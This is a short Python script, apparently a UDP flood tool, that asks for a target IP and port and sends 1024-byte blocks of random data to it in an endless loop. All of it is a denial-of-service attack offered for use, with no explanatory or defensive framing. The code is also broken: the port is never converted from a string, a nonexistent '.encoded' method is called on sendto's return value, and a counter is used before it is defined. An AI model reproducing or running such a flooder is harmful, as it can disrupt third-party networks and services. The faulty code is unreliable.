import socket
import random

ip = input("Target Ip: ")
port = input("Port: ")
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

byte = random._urandom(1024)


while 1:
    s.sendto(byte,(ip,port)).encoded('utf-8')
    print ("sending data")
    sent = sent + 1